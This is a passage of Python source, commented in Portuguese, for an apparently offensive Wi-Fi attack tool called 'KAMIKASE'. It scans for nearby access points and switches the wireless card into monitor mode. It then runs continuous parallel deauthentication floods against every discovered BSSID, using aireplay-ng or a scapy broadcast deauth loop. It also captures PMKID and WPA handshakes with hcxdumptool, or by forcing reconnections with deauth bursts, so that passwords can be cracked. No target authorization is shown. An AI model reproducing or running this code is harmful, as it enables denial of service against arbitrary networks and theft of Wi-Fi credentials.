                    val_novo_valido = v not in (None, "", "?")
                    if val_atual_invalido and val_novo_valido:
                        mesclado[k] = v
                    elif k == "rssi" or k == "rssi_dbm":
                        # Preserva RSSI mais forte (menos negativo) entre os dois
                        try:
                            r_atual = float(val_atual) if not val_atual_invalido else -200
                            r_novo = float(v) if val_novo_valido else -200
                            if r_novo > r_atual:
                                mesclado[k] = v
                        except Exception:
                            pass
                    elif k == "security" or k == "crypto":
                        # Prefere security mais informativa (mais longa)
                        if val_novo_valido and len(str(v)) > len(str(val_atual or "")):
                            mesclado[k] = v
                    elif k == "essid":
                        # Prefere ESSID não-oculto
                        if val_novo_valido and v != "<oculto>" and val_atual == "<oculto>":
                            mesclado[k] = v

                # Source: concat de todas as fontes
                fontes = set(str(atual.get("source", "")).split("+")) if atual.get("source") else set()
                fontes.add(str(norm.get("source", "?")))
                mesclado["source"] = "+".join(sorted(f for f in fontes if f and f != "?")) or "?"
                por_bssid[bssid] = mesclado
        return sorted(por_bssid.values(),
                      key=lambda a: (str(a.get("essid", "")).lower(), a.get("bssid", "")))

    def _adicionar_ou_mesclar_ap(self, novo_ap: Dict[str, Any]) -> Tuple[Dict[str, Any], bool]:
        """Adiciona AP novo a self.alvos OU mescla com existente (sem duplicar).
        Retorna (ap_final, eh_novo). Usado pelo scan contínuo + nmcli button."""
        norm = self._normalizar_ap(novo_ap, novo_ap.get("source", ""))
        if not norm:
            return novo_ap, False
        bssid = norm["bssid"]
        # Procura existente
        for i, existente in enumerate(self.alvos):
            if existente.get("bssid") == bssid:
                # Mescla preservando dados úteis
                mesclados = self._mesclar_aps([existente, norm])
                if mesclados:
                    self.alvos[i] = mesclados[0]
                    return self.alvos[i], False
                return existente, False
        # Não existe: adiciona
        self.alvos.append(norm)
        return norm, True

    def _scan_aps_kali(self, timeout_sec: int = 12, scan_profundo: bool = False) -> List[Dict[str, Any]]:
        """Coleta APs via nmcli, iw e scapy (se profundo). Retorna LISTA BRUTA
        sem mesclar — o merge é feito UMA VEZ em _descobrir_aps (B3)."""
        listas: List[Dict[str, Any]] = []
        try:
            nmcli_aps = self._scan_aps_nmcli(timeout_sec=timeout_sec)
            if nmcli_aps:
                listas.extend(nmcli_aps)
            else:
                self.ui.info("  nmcli nao retornou APs, tentando iw...")
        except Exception as e:
            self.ui.warn(f"  nmcli falhou: {e}, tentando iw...")
        if HAS_IW:
            try:
                iw_aps = self._scan_aps_iw(timeout_sec=timeout_sec + (8 if scan_profundo else 4))
                if iw_aps:
                    listas.extend(iw_aps)
            except Exception as e:
                self.ui.warn(f"  iw scan falhou: {e}")
        if scan_profundo and HAS_SCAPY:
            try:
                scapy_aps = self._scan_aps_scapy(timeout_sec=15)
                if scapy_aps:
                    listas.extend(scapy_aps)
            except Exception as e:
                self.ui.warn(f"  scapy scan falhou: {e}")
        return listas

    async def _descobrir_aps(self, scan_profundo: bool = False) -> bool:
        """Descobre APs visíveis. Acumula resultados de múltiplos métodos e
        chama _mesclar_aps UMA SÓ VEZ no final (B3 — dedup unificado)."""
        self.ui.info(f"Descobrindo APs visíveis...{' (modo profundo)' if scan_profundo else ''}")
        timeout_base = 20 if scan_profundo else 12
        coletados: List[Dict[str, Any]] = []  # lista bruta, ainda sem dedup

        # Coleta de todos os métodos disponíveis para o motor atual
        try:
            if self.ctx.motor == "adm":
                coletados.extend(self._scan_aps_windows(timeout_sec=timeout_base) or [])
            elif self.ctx.motor == "root-kali":
                coletados.extend(self._scan_aps_kali(timeout_sec=timeout_base,
                                                      scan_profundo=scan_profundo) or [])
                # Se nada veio, tenta iw isolado como fallback final
                if not coletados and HAS_IW:
                    coletados.extend(self._scan_aps_iw(timeout_sec=timeout_base + 5) or [])
            elif self.ctx.motor == "root-termux":
                coletados.extend(self._scan_aps_termux(timeout_sec=timeout_base) or [])
        except Exception as e:
            self.ui.warn(f"  Scan via método nativo falhou: {e}")

        # Complemento scapy (sempre que possível, para enriquecer)
        # Antes só rodava se nada foi achado OU scan_profundo. Agora roda
        # se profundo OU se temos < 3 APs (para tentar achar mais)
        if HAS_SCAPY and (scan_profundo or len(coletados) < 3):
            scan_time = 15 if scan_profundo else 10
            self.ui.info(f"  Scan scapy beacon sniff ({scan_time}s)...")
            try:
                scapy_aps = self._scan_aps_scapy(timeout_sec=scan_time)
                if scapy_aps:
                    coletados.extend(scapy_aps)
            except Exception as e:
                self.ui.warn(f"  scapy fallback falhou: {e}")

        if not coletados:
            return False

        # Dedup + merge ÚNICO no final (mais robusto que dedup parcial)
        self.alvos = self._mesclar_aps(coletados)
        rows = [[a.get("essid", "?")[:24], a.get("bssid", "?"),
                 str(a.get("canal", "?")), str(a.get("freq_mhz", "?")),
                 str(a.get("band_label", "?")), str(a.get("rssi_dbm", "?"))]
                for a in self.alvos[:30]]
        self.ui.table(f"APs Descobertos ({len(self.alvos)})",
                       [("ESSID", C_CYAN), ("BSSID", C_WHITE),
                        ("Canal", C_YELLOW), ("MHz", C_CYAN),
                        ("Banda", C_YELLOW), ("RSSI dBm", C_GREEN)], rows)
        return True

    def _scan_aps_windows(self, timeout_sec: int = 10) -> List[Dict[str, Any]]:
        try:
            saida = subprocess.check_output(
                ["netsh", "wlan", "show", "networks", "mode=bssid"],
                text=True, errors="ignore", timeout=timeout_sec)
        except Exception:
            return []
        alvos = []
        ssid_atual = ""
        for linha in saida.splitlines():
            m = re.match(r"\s*SSID\s+\d+\s*:\s*(.*)", linha)
            if m:
                ssid_atual = m.group(1).strip()
                continue
            m = re.match(r"\s*BSSID\s+\d+\s*:\s*([0-9a-f:]+)", linha, re.I)
            if m:
                alvos.append({"essid": ssid_atual or "<oculto>",
                              "bssid": m.group(1).upper(),
                              "canal": "?", "rssi": "?"})
                continue
            m = re.match(r"\s*Signal\s*:\s*(\d+)%", linha)
            if m and alvos:
                pct = int(m.group(1))
                # Conversão grosseira % → dBm
                alvos[-1]["rssi"] = -100 + (pct // 2)
            m = re.match(r"\s*Channel\s*:\s*(\d+)", linha)
            if m and alvos:
                alvos[-1]["canal"] = int(m.group(1))
        return alvos

    def _scan_aps_nmcli(self, timeout_sec: int = 12) -> List[Dict[str, Any]]:
        """Scan via nmcli em formato multiline para evitar parsing fragil de BSSID."""
        if not shutil.which("nmcli"):
            return []
        try:
            subprocess.run(["nmcli", "device", "wifi", "rescan"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                           timeout=min(8, timeout_sec))
        except Exception:
            pass
        try:
            saida = subprocess.check_output(
                ["nmcli", "-m", "multiline", "-f",
                 "SSID,BSSID,CHAN,FREQ,SIGNAL,SECURITY",
                 "device", "wifi", "list", "--rescan", "yes"],
                text=True, errors="ignore", timeout=timeout_sec)
        except Exception:
            try:
                saida = subprocess.check_output(
                    ["nmcli", "-m", "multiline", "-f",
                     "SSID,BSSID,CHAN,SIGNAL,SECURITY",
                     "device", "wifi", "list"],
                    text=True, errors="ignore", timeout=timeout_sec)
            except Exception:
                return []
        alvos: List[Dict[str, Any]] = []
        atual: Dict[str, str] = {}

        def flush_atual():
            if not atual:
                return
            bssid = self._normalizar_bssid(atual.get("BSSID"))
            if not bssid:
                atual.clear()
                return
            signal = atual.get("SIGNAL", "?")
            freq_raw = atual.get("FREQ", "?")
            freq_match = re.search(r"\d+", str(freq_raw))
            freq_mhz = int(freq_match.group(0)) if freq_match else "?"
            alvos.append({
                "essid": self._escape_nmcli_value(atual.get("SSID", "")) or "<oculto>",
                "bssid": bssid,
                "canal": atual.get("CHAN", "?"),
                "freq_mhz": freq_mhz,
                "signal_percent": signal,
                "rssi": self._signal_percent_para_dbm(signal),
                "security": self._escape_nmcli_value(atual.get("SECURITY", "")) or "OPEN",
                "source": "nmcli",
            })
            atual.clear()

        for linha in saida.splitlines():
            if not linha.strip():
                flush_atual()
                continue
            m = re.match(r"\s*([A-Z0-9_-]+):\s*(.*)\s*$", linha)
            if not m:
                continue
            chave, valor = m.group(1), m.group(2)
            if chave == "SSID" and atual.get("BSSID"):
                flush_atual()
            atual[chave] = valor
        flush_atual()
        return alvos

    def _scan_aps_iw(self, timeout_sec: int = 15) -> List[Dict[str, Any]]:
        if not HAS_IW:
            return []
        try:
            # Tenta scan normal primeiro
            saida = subprocess.check_output(
                ["iw", "dev", self.iface_orig, "scan"],
                text=True, errors="ignore", timeout=timeout_sec)
        except subprocess.TimeoutExpired:
            # Se timeout, tenta com su (pode precisar de privilégios)
            if self.ctx.ativo:
                try:
                    cmd = f"iw dev {self.iface_orig} scan"
                    saida = subprocess.check_output(
                        ["su", "-c", cmd] if self.ctx.motor == "root-termux" else ["sudo", "iw", "dev", self.iface_orig, "scan"],
                        text=True, errors="ignore", timeout=timeout_sec + 5)
                except Exception:
                    return []
            else:
                return []
        except Exception:
            return []
        alvos = []
        bssid_atual: Optional[Dict[str, Any]] = None
        for linha in saida.splitlines():
            m = re.match(r"BSS\s+([0-9a-f:]+)", linha, re.I)
            if m:
                if bssid_atual:
                    alvos.append(bssid_atual)
                bssid_atual = {"bssid": m.group(1).upper(), "essid": "<oculto>",
                               "canal": "?", "rssi": "?", "freq_mhz": "?",
                               "security": "OPEN", "source": "iw"}
                continue
            if not bssid_atual:
                continue
            m = re.match(r"\s*SSID:\s*(.+)", linha)
            if m:
                bssid_atual["essid"] = m.group(1).strip() or "<oculto>"
            m = re.match(r"\s*signal:\s*(-?\d+\.?\d*)\s*dBm", linha)
            if m:
                bssid_atual["rssi"] = float(m.group(1))
                bssid_atual["rssi_dbm"] = float(m.group(1))
            m = re.match(r"\s*freq:\s*(\d+)", linha)
            if m:
                bssid_atual["freq_mhz"] = int(m.group(1))
            m = re.match(r"\s*DS Parameter set: channel\s+(\d+)", linha)
            if m:
                bssid_atual["canal"] = int(m.group(1))
            m = re.match(r"\s*\* primary channel:\s+(\d+)", linha)
            if m:
                bssid_atual["canal"] = int(m.group(1))
            if "WPA:" in linha or "RSN:" in linha:
                atual_sec = bssid_atual.get("security", "OPEN")
                if "RSN:" in linha and "WPA2" not in atual_sec:
                    bssid_atual["security"] = "WPA2" if atual_sec == "OPEN" else f"{atual_sec} WPA2"
                if "WPA:" in linha and "WPA" not in atual_sec:
                    bssid_atual["security"] = "WPA" if atual_sec == "OPEN" else f"{atual_sec} WPA"
        if bssid_atual:
            alvos.append(bssid_atual)
        return alvos

    def _scan_aps_termux(self, timeout_sec: int = 10) -> List[Dict[str, Any]]:
        # Tenta termux-wifi-scaninfo (JSON) primeiro
        try:
            saida = subprocess.check_output(
                ["termux-wifi-scaninfo"], text=True, errors="ignore", timeout=timeout_sec)
            data = json.loads(saida)
            return [{"essid": d.get("ssid", "<oculto>"),
                     "bssid": d.get("bssid", "?").upper(),
                     "canal": d.get("frequency_mhz", "?"),
                     "rssi": d.get("rssi", "?")}
                    for d in data]
        except Exception:
            pass
        # Fallback: su -c "iw dev wlan0 scan"
        if HAS_SU or self.ctx.ativo:
            try:
                cmd = f"iw dev {self.iface_orig} scan"
                saida = subprocess.check_output(
                    ["su", "-c", cmd],
                    text=True, errors="ignore", timeout=timeout_sec + 5)
                return self._parse_iw_scan(saida)
            except Exception:
                pass
        return []

    def _parse_iw_scan(self, saida: str) -> List[Dict[str, Any]]:
        alvos = []
        cur: Optional[Dict[str, Any]] = None
        for linha in saida.splitlines():
            m = re.match(r"BSS\s+([0-9a-f:]+)", linha, re.I)
            if m:
                if cur: alvos.append(cur)
                cur = {"bssid": m.group(1).upper(), "essid": "<oculto>",
                       "canal": "?", "rssi": "?", "freq_mhz": "?",
                       "security": "OPEN", "source": "iw"}
                continue
            if not cur: continue
            m = re.match(r"\s*SSID:\s*(.+)", linha)
            if m: cur["essid"] = m.group(1).strip() or "<oculto>"
            m = re.match(r"\s*signal:\s*(-?\d+\.?\d*)", linha)
            if m: cur["rssi"] = float(m.group(1))
            m = re.match(r"\s*freq:\s*(\d+)", linha)
            if m: cur["freq_mhz"] = int(m.group(1))
            m = re.match(r"\s*DS Parameter set: channel\s+(\d+)", linha)
            if m: cur["canal"] = int(m.group(1))
            if "WPA:" in linha or "RSN:" in linha:
                atual_sec = cur.get("security", "OPEN")
                if "RSN:" in linha and "WPA2" not in atual_sec:
                    cur["security"] = "WPA2" if atual_sec == "OPEN" else f"{atual_sec} WPA2"
                if "WPA:" in linha and "WPA" not in atual_sec:
                    cur["security"] = "WPA" if atual_sec == "OPEN" else f"{atual_sec} WPA"
        if cur: alvos.append(cur)
        return alvos

    def _scan_aps_scapy(self, timeout_sec: int = 8) -> List[Dict[str, Any]]:
        if not HAS_SCAPY:
            return []
        encontrados: Dict[str, Dict[str, Any]] = {}

        def cb(p):
            try:
                if p.haslayer(Dot11Beacon):
                    bssid = p[Dot11].addr2.upper()
                    if bssid not in encontrados:
                        try:
                            essid = p[Dot11Elt].info.decode(errors="ignore") or "<oculto>"
                        except Exception:
                            essid = "<oculto>"
                        # Extrai canal do DS Parameter Set (ID=3) ou HT Information
                        canal = "?"
                        try:
                            for elt in p[Dot11Beacon].payload:
                                if hasattr(elt, 'ID') and elt.ID == 3:  # DS Parameter Set
                                    canal = int(ord(elt.info))
                                    break
                                elif hasattr(elt, 'ID') and elt.ID == 61:  # HT Information (fallback)
                                    if len(elt.info) > 0:
                                        canal = int(elt.info[0])
                                        break
                        except Exception:
                            pass
                        # Extrai RSSI se disponível
                        rssi = "?"
                        try:
                            if hasattr(p, 'dBm_AntSignal'):
                                rssi = int(p.dBm_AntSignal)
                            elif hasattr(p, 'RSSI'):
                                rssi = int(p.RSSI)
                        except Exception:
                            pass
                        encontrados[bssid] = {
                            "bssid": bssid, "essid": essid,
                            "canal": canal, "freq_mhz": self._canal_para_freq(canal) or "?",
                            "rssi": rssi, "rssi_dbm": rssi,
                            "security": "?", "source": "scapy",
                        }
            except Exception:
                pass

        try:
            iface = self.iface_monitor if self.iface_monitor else self.iface_orig
            sniff(iface=iface, prn=cb, timeout=timeout_sec, store=False)
        except Exception as e:
            self.ui.warn(f"  Scapy sniff falhou: {e}")
        return list(encontrados.values())

    # ─── MONITOR MODE ────────────────────────────────────────

    def _setup_monitor(self) -> bool:
        """Setup monitor mode robusto. No Kali:
        1) airmon-ng check kill (mata NetworkManager/wpa_supplicant)
        2) airmon-ng start <iface>
        3) Detecta nome real via `iw dev` (mais confiável que regex de saída)
        4) Fallback `iw set type monitor` se airmon-ng falhar"""
        if self.ctx.motor == "adm":
            self.iface_monitor = self.iface_orig  # NPCAP injeta direto
            self.ui.info("Windows: scapy/NPCAP injeta sem mudar para monitor mode.")
            return True

        if self.ctx.motor == "root-kali" and HAS_AIRMON:
            # 1) Mata processos conflitantes (essencial pra estabilidade)
            try:
                self.ui.info("airmon-ng check kill — encerrando processos conflitantes...")
                subprocess.run(["airmon-ng", "check", "kill"],
                               timeout=12, check=False,
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception:
                pass
            # 2) airmon-ng start
            try:
                saida = subprocess.check_output(
                    ["airmon-ng", "start", self.iface_orig],
                    text=True, errors="ignore", timeout=15)
                # 3) Descobre nome real via `iw dev` (procura type=monitor)
                self.iface_monitor = self._descobrir_iface_monitor() or ""
                if not self.iface_monitor:
                    # Fallback: parse da saída
                    m = re.search(r"\[?phy\d+\]?(\w+mon|\w+\d+)", saida)
                    self.iface_monitor = m.group(1) if m else (self.iface_orig + "mon")
                # Confirma que existe
                if not self._iface_existe(self.iface_monitor):
                    self.ui.warn(f"  airmon-ng disse {self.iface_monitor} mas iface não existe; tentando iw...")
                else:
                    self.ui.success(f"✓ Monitor mode ativo: {self.iface_monitor}")
                    return True
            except Exception as e:
                self.ui.warn(f"airmon-ng falhou: {e}; tentando iw...")

        # Fallback iw
        if HAS_IW:
            try:
                cmd_pre = ["ip", "link", "set", self.iface_orig, "down"]
                cmd_set = ["iw", "dev", self.iface_orig, "set", "type", "monitor"]
                cmd_up = ["ip", "link", "set", self.iface_orig, "up"]
                if self.ctx.motor == "root-termux":
                    cmd_pre = ["su", "-c", " ".join(cmd_pre)]
                    cmd_set = ["su", "-c", " ".join(cmd_set)]
                    cmd_up = ["su", "-c", " ".join(cmd_up)]
                subprocess.run(cmd_pre, timeout=5, check=False)
                subprocess.run(cmd_set, timeout=5, check=False)
                subprocess.run(cmd_up, timeout=5, check=False)
                self.iface_monitor = self.iface_orig
                self.ui.success(f"✓ Monitor mode (iw) em: {self.iface_monitor}")
                return True
            except Exception as e:
                self.ui.error(f"iw set monitor falhou: {e}")
        return False

    @staticmethod
    def _iface_existe(nome: str) -> bool:
        try:
            return os.path.exists(f"/sys/class/net/{nome}")
        except Exception:
            return False

    def _descobrir_iface_monitor(self) -> Optional[str]:
        """Roda `iw dev` e retorna nome da primeira iface em type=monitor."""
        if not HAS_IW:
            return None
        try:
            saida = subprocess.check_output(["iw", "dev"], text=True,
                                             errors="ignore", timeout=5)
            # Parse: blocos por interface, procura "type monitor"
            atual = None
            for linha in saida.splitlines():
                m = re.match(r"\s*Interface\s+(\S+)", linha)
                if m:
                    atual = m.group(1)
                if atual and "type monitor" in linha:
                    return atual
        except Exception:
            return None
        return None

    # ─── ATAQUE ──────────────────────────────────────────────

    def _iniciar_ataques_paralelos(self):
        self.ui.section("KAMIKASE ENGAGED — Pressione Ctrl+C para encerrar")
        for alvo in self.alvos:
            bssid = alvo["bssid"]
            # Thread por BSSID
            t = threading.Thread(
                target=self._atacar_bssid,
                args=(alvo,),
                daemon=True,
                name=f"kami-{bssid}")
            t.start()
            self.threads.append(t)

    def _atacar_bssid(self, alvo: Dict[str, Any]):
        bssid = alvo["bssid"]
        # Tenta aireplay-ng primeiro (mais confiável)
        if HAS_AIREPLAY and self.ctx.motor in ("root-kali", "root-termux"):
            try:
                cmd = ["aireplay-ng", "-0", "0", "-a", bssid, self.iface_monitor]
                if self.ctx.motor == "root-termux":
                    cmd = ["su", "-c", " ".join(cmd)]
                proc = subprocess.Popen(
                    cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                    text=True, errors="ignore")
                self.subprocs.append(proc)
                # Lê stdout para contar deauths
                for linha in proc.stdout:
                    if self.stop_event.is_set():
                        break
                    if "Sending DeAuth" in linha or "Sending Deauth" in linha:
                        with self.contador_lock:
                            self.contador_global += 64  # aireplay envia em bursts
                            self.contador_por_bssid[bssid] += 64
                return
            except Exception:
                pass
        # Fallback scapy
        if HAS_SCAPY:
            self._scapy_deauth_loop(bssid)

    def _scapy_deauth_loop(self, bssid: str):
        try:
            from scapy.all import RadioTap as _RT, Dot11 as _D11, Dot11Deauth as _DD, sendp as _sendp
        except Exception:
            return
        pkt_broadcast = _RT()/_D11(addr1="ff:ff:ff:ff:ff:ff",
                                    addr2=bssid, addr3=bssid)/_DD(reason=7)
        while not self.stop_event.is_set():
            try:
                _sendp(pkt_broadcast, iface=self.iface_monitor,
                       count=64, inter=0.005, verbose=False)
                with self.contador_lock:
                    self.contador_global += 64
                    self.contador_por_bssid[bssid] += 64
            except Exception:
                time.sleep(0.05)

    # ─── UI LIVE ─────────────────────────────────────────────

    async def _loop_ui_live(self):
        # Atualização simples a cada 1s (sem rich.Live para evitar conflitos)
        ultimo_total = 0
        ultimo_t = time.time()
        while not self.stop_event.is_set():
            await asyncio.sleep(1.0)
            agora = time.time()
            with self.contador_lock:
                total = self.contador_global
            delta = total - ultimo_total
            dt = max(agora - ultimo_t, 0.001)
            pps = int(delta / dt)
            ultimo_total = total
            ultimo_t = agora
            elapsed = int(agora - self.start_time)
            mins, secs = divmod(elapsed, 60)
            ativos = sum(1 for t in self.threads if t.is_alive())
            print(f"\r  ⚡ KAMIKASE [{mins:02d}:{secs:02d}] "
                  f"Pacotes: {total:,} | PPS: {pps:,} | BSSIDs ativos: {ativos}/{len(self.alvos)}",
                  end="", flush=True)

    # ─── ENCERRAMENTO ────────────────────────────────────────

    def _encerrar_limpo(self):
        print()  # quebra linha do print live
        self.ui.section("KAMIKASE — encerrando")
        self.stop_event.set()
        # Para carrossel primeiro (mata aireplays e airodumps em curso)
        if self.carrossel:
            try: self.carrossel.parar()
            except Exception: pass
        # Mata subprocess (snapshot da lista — threads filhas podem appendar)
        for p in list(self.subprocs):
            try:
                p.terminate()
                try:
                    p.wait(timeout=3)
                except Exception:
                    p.kill()
            except Exception:
                pass
        # Aguarda threads scapy (snapshot)
        for t in list(self.threads):
            t.join(timeout=2)
        # Restaura monitor → managed
        self._restaurar_iface()
        # Audit log final
        self._audit_log_fim()
        # Sumário
        duracao = time.time() - self.start_time if self.start_time else 0
        with self.contador_lock:
            total = self.contador_global
        self.ui.success(f"Total: {total:,} pacotes | Duração: {duracao:.1f}s | "
                        f"BSSIDs: {len(self.alvos)}")
        self.ui.info(f"Audit log: {self.audit_path}")

    def _restaurar_iface(self):
        if self.ctx.motor == "adm":
            return  # nada a fazer
        if self.ctx.motor == "root-kali" and HAS_AIRMON and self.iface_monitor:
            try:
                subprocess.run(["airmon-ng", "stop", self.iface_monitor],
                               timeout=10, check=False,
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception:
                pass
        elif HAS_IW and self.iface_orig:
            try:
                cmds = [
                    ["ip", "link", "set", self.iface_orig, "down"],
                    ["iw", "dev", self.iface_orig, "set", "type", "managed"],
                    ["ip", "link", "set", self.iface_orig, "up"],
                ]
                for c in cmds:
                    if self.ctx.motor == "root-termux":
                        c = ["su", "-c", " ".join(c)]
                    subprocess.run(c, timeout=5, check=False,
                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception:
                pass

        if self.ctx.motor == "root-kali":
            try:
                subprocess.run(["systemctl", "restart", "NetworkManager"],
                               timeout=10, check=False,
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception:
                pass

    # ─── AUDIT LOG ───────────────────────────────────────────

    def _audit_log_inicio(self):
        try:
            base = self.det.output_dir or Path(".")
            base.mkdir(parents=True, exist_ok=True)
            self.audit_path = base / "kamikase_audit.log"
        except Exception:
            self.audit_path = Path("kamikase_audit.log")
        try:
            with self.audit_path.open("a", encoding="utf-8") as f:
                f.write(f"\n=== KAMIKASE INICIO {datetime.now().isoformat()} ===\n")
                f.write(f"Plataforma: {self.ctx.plataforma} | Motor: {self.ctx.motor}\n")
                f.write(f"Interface: {self.iface_orig} | Monitor: {self.iface_monitor}\n")
                f.write(f"BSSIDs alvos ({len(self.alvos)}):\n")
                for a in self.alvos:
                    f.write(f"  - {a.get('bssid', '?')} | {a.get('essid', '?')} "
                            f"| canal {a.get('canal', '?')} | RSSI {a.get('rssi', '?')}\n")
                f.write(f"Comando: {' '.join(sys.argv)}\n")
        except Exception:
            pass

    def _audit_log_fim(self):
        try:
            duracao = time.time() - self.start_time if self.start_time else 0
            with self.contador_lock:
                total = self.contador_global
            with self.audit_path.open("a", encoding="utf-8") as f:
                f.write(f"=== KAMIKASE FIM {datetime.now().isoformat()} ===\n")
                f.write(f"Duração: {duracao:.2f}s | Total: {total} pacotes\n")
                f.write(f"Motivo: {self.encerramento_motivo or 'normal'}\n")
                for bssid, cnt in self.contador_por_bssid.items():
                    f.write(f"  - {bssid}: {cnt} pacotes\n")
        except Exception:
            pass


# ══════════════════ EVENT BUS — DASHBOARD --live ══════════════
# Singleton acoplado ao SocketIO. Quando o dashboard está ativo,
# qualquer módulo emite eventos via bus.emit() e o painel atualiza ao vivo.

class EventBus:
    """Hub de eventos — desacopla módulos do canal de transporte."""

    def __init__(self):
        self.socketio: Optional[Any] = None
        self.queued: List[Tuple[str, Dict]] = []  # cache pré-conexão
        self.lock = threading.Lock()

    def attach(self, sio: Any):
        self.socketio = sio
        # drena fila (caso eventos tenham sido emitidos antes de conectar)
        with self.lock:
            for nome, dados in self.queued:
                try:
                    sio.emit(nome, dados)
                except Exception:
                    pass
            self.queued.clear()

    def emit(self, nome: str, dados: Dict):
        if self.socketio:
            try:
                self.socketio.emit(nome, dados)
            except Exception:
                pass
        else:
            with self.lock:
                if len(self.queued) < 500:
                    self.queued.append((nome, dados))


# Bus global — None se --live não passou
event_bus: Optional[EventBus] = None


def emitir(evento: str, **dados):
    """Helper conveniência: emite evento se bus existe, no-op senão.
    `evento` é o nome do canal SocketIO; `**dados` vão como payload (podem
    incluir uma chave 'nome' sem colidir com o parâmetro)."""
    if event_bus is not None:
        event_bus.emit(evento, dados)


# ══════════════════ AUDITOR DE SEGURANÇA WIFI ═════════════════
# Usado pelo --kamikase --live para classificar APs por risco.

class WifiSecurityAuditor:
    """Audita um AP a partir do dump do `iw scan` ou `airodump-ng csv`.
    Detecta WPS habilitado, criptografia legacy (WEP/TKIP), beacon interval
    anômalo, e vazamento de potência (sinal forte = AP fora do perímetro)."""

    @staticmethod
    def auditar(ap: Dict[str, Any]) -> Dict[str, Any]:
        achados: List[Dict[str, Any]] = []
        score = 100

        crypto = (ap.get("crypto") or "").upper()
        if "WEP" in crypto:
            achados.append({"tipo": "crypto_weak", "severidade": "critica",
                            "descricao": "WEP legado — quebrado em minutos"})
            score -= 60
        elif "TKIP" in crypto and "CCMP" not in crypto:
            achados.append({"tipo": "crypto_weak", "severidade": "alta",
                            "descricao": "TKIP sem CCMP — vulnerável a ataques de chave"})
            score -= 35
        elif crypto in ("OPN", "OPEN", ""):
            achados.append({"tipo": "open_network", "severidade": "alta",
                            "descricao": "Rede aberta sem criptografia"})
            score -= 50

        if ap.get("wps_enabled"):
            achados.append({"tipo": "wps_enabled", "severidade": "alta",
                            "descricao": "WPS ativo — vulnerável a Pixie Dust / Reaver"})
            score -= 30

        beacon = ap.get("beacon_interval", 100)
        if beacon and (beacon < 50 or beacon > 500):
            achados.append({"tipo": "beacon_anomalo", "severidade": "info",
                            "descricao": f"Beacon interval {beacon}ms incomum (esperado ~100ms)"})
            score -= 5

        rssi = ap.get("rssi")
        try:
            rssi_v = float(rssi) if rssi not in (None, "?") else -100
            if rssi_v > -30:
                achados.append({"tipo": "sinal_excessivo", "severidade": "media",
                                "descricao": f"RSSI {rssi_v}dBm — vazando para fora do perímetro"})
                score -= 15
        except Exception:
            pass

        # Mapa fácil pra UI: cor + label
        sev_max = max((a["severidade"] for a in achados),
                      key=lambda s: ["info", "media", "alta", "critica"].index(s),
                      default="info")
        return {
            "score": max(0, min(100, score)),
            "achados": achados,
            "severidade_maior": sev_max if achados else "ok",
        }


# ══════════════════ CAPTURA PMKID/HANDSHAKE ════════════════════
# Tenta hcxdumptool para PMKID; fallback: deauth + airodump captura handshake.

class PMKIDCapture:
    """Captura PMKID via hcxdumptool ou handshake via airodump+aireplay."""

    def __init__(self, ui: "TerminalUI", iface: str, timeout_s: int = 30):
        self.ui = ui
        self.iface = iface
        self.timeout_s = timeout_s
        HANDSHAKE_DIR.mkdir(parents=True, exist_ok=True)

    def capturar(self, bssid: str, canal: int = 0) -> Optional[Path]:
        """Tenta PMKID primeiro (rápido, não precisa cliente associado).
        Fallback para deauth+handshake se hcx falhar. Retorna pcapng path."""
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        nome = bssid.replace(":", "")
        out = HANDSHAKE_DIR / f"hs_{nome}_{ts}.pcapng"

        # Tenta PMKID via hcxdumptool primeiro
        if HAS_HCXDUMPTOOL:
            self.ui.info(f"  PMKID: hcxdumptool em {bssid} (até {self.timeout_s}s)")
            try:
                # Cria arquivo temporário de filtro
                filter_file = HANDSHAKE_DIR / f"filter_{nome}.txt"
                filter_file.write_text(bssid + "\n")
                
                cmd = ["hcxdumptool", "-i", self.iface,
                       "-w", str(out),
                       "--filterlist_ap", str(filter_file),
                       "--filtermode=2",
                       "--enable_status=1"]
                
                proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                         stderr=subprocess.PIPE,
                                         text=True)
                try:
                    proc.wait(timeout=self.timeout_s)
                except subprocess.TimeoutExpired:
                    proc.terminate()
                    try: 
                        proc.wait(timeout=3)
                    except Exception: 
                        proc.kill()
                
                # Limpa arquivo de filtro
                if filter_file.exists():
                    filter_file.unlink()
                
                if out.exists() and out.stat().st_size > 100:
                    self.ui.success(f"  ✓ PMKID capturado: {out.name}")
                    return out
            except Exception as e:
                self.ui.warn(f"  hcxdumptool falhou: {e}")
                if 'filter_file' in locals() and filter_file.exists():
                    filter_file.unlink()

        # Fallback: airodump-ng captura + aireplay-ng deauth (clássico)
        if HAS_AIRODUMP and HAS_AIREPLAY:
            self.ui.info(f"  Fallback: airodump+aireplay deauth para forçar handshake")
            try:
                base = str(out.with_suffix(""))
                cmd_dump = ["airodump-ng", "--bssid", bssid,
                            "--channel", str(canal or 1),
                            "-w", base, "--output-format", "pcapng",
                            self.iface]
                p_dump = subprocess.Popen(cmd_dump, stdout=subprocess.DEVNULL,
                                           stderr=subprocess.DEVNULL)
                
                # Aguarda airodump iniciar
                time.sleep(3)
                
                # Deauth burst para forçar reconexão e capturar handshake
                cmd_deauth = ["aireplay-ng", "-0", "20", "-a", bssid, self.iface]
                try:
                    subprocess.run(cmd_deauth, stdout=subprocess.DEVNULL,
                                   stderr=subprocess.DEVNULL, timeout=20)
                except subprocess.TimeoutExpired:
                    pass
                
                # Aguarda mais tempo pro handshake
                time.sleep(self.timeout_s - 23 if self.timeout_s > 23 else 10)
                
                p_dump.terminate()
                try: 
                    p_dump.wait(timeout=3)
                except Exception: 
                    p_dump.kill()
                
                # airodump cria <base>-01.pcapng
                achados = list(HANDSHAKE_DIR.glob(f"{out.stem.split('_')[0]}*.pcapng"))
                achados.sort(key=lambda p: p.stat().st_mtime, reverse=True)
                if achados and achados[0].stat().st_size > 1000:
                    self.ui.success(f"  ✓ Handshake capturado: {achados[0].name}")
                    return achados[0]
            except Exception as e:
                self.ui.warn(f"  Fallback handshake falhou: {e}")
        
        self.ui.error(f"  ✗ Falha ao capturar handshake/PMKID para {bssid}")
        return None

